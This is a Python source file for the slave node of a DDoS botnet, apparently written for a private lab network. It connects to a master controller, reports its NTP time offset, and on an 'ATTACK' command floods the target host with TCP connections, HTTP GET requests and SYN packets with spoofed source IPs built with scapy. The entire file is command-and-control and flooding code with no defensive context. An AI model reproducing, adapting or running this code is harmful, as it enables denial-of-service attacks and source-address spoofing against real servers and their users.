#!/usr/bin/python
import time, os, sys, string, ntplib, random
from socket import *
from time import ctime
import scapy.all as scapy

##Setting up variables
SERVER_HOST = '10.1.1.50'
SERVER_PORT = 8080
MS_LISTEN_HOST = '10.1.1.20'
MS_LISTEN_PORT = 8081

class Slave():
    def __init__(self, host, port, sock=None):
        print("DDoS mode loaded")
        self.host = host
        self.port = port
        self.message='asdf'
        conn=input("How many connections do you want to make: ")
        ip = gethostbyname(self.host)
        self.num_connections = 0

        # get ntp times
        ntpc = ntplib.NTPClient()
        ntp_res = ntpc.request('10.1.1.50', version=3)

        # connect to master
        self.masterHost = MS_LISTEN_HOST
        self.masterPort = MS_LISTEN_PORT
        self.sockMaster = socket(AF_INET, SOCK_STREAM)
        self.sockMaster.connect((self.masterHost, self.masterPort))
        self.sockMaster.send('Slave offset is: {0}'.format(ntp_res.offset))

    def acceptMessages(self):
        msg_buf = self.sockMaster.recv(64)
        if len(msg_buf) > 0:
          print(msg_buf)
          if (msg_buf.startswith('ATTACK')):
              command, host, port, offset = msg_buf.split()
              self.doTheDos(host, int(port), float(offset))

    def doTheDos(self, host, port, offset):
        for _ in range(0, 5):
          self.dos(host, port)

    def dos(self, host, port):
        try:
            self.ddos = socket(AF_INET, SOCK_STREAM)
            self.ddos.connect((host, port))
            self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
            #IP Spoof
            src = "10.1.1.{0}".format(random.randint(0,255))
            spoofed_SYN =scapy.IP(dst=host,src=src)/scapy.TCP(dport=8080,sport=5000,flags='S')
            scapy.send(spoofed_SYN)
        except error, msg:
            print error
            print msg
            self.num_connections = self.num_connections+1
            print("|[Connection Failed] | %d", self.num_connections )
        print ("|[DDoS Attack Engaged] |")
        #ddos.close()

if __name__ == '__main__':
  slaveNode = Slave('localhost', 8080)

  while(1):
#for i in xrange(conn):
    #slaveNode.dos()
    slaveNode.acceptMessages()
